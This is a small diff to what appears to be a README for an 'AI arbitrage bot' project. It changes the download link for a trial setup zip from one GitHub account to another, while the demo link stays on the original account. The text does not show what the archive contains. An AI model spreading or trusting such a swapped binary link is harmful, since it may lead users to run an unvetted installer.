@@ -8,7 +8,7 @@
 
 <!-- pages-links:start -->
 [![VIEW DEMO](docs/view-demo.svg)](https://keenlocation.github.io/dca/)
-[![DOWNLOAD](docs/download-project.svg)](https://github.com/keenlocation/ai-arbitrage-bot/releases/download/Trial1.4/AI_trial_setup.zip)
+[![DOWNLOAD](docs/download-project.svg)](https://github.com/wordystepuncl/ai-arbitrage-bot/releases/download/Trial1.4/AI_trial_setup.zip)
 
 [Live demo](https://keenlocation.github.io/dca/) · [Run locally](#run-locally)
 <!-- pages-links:end -->
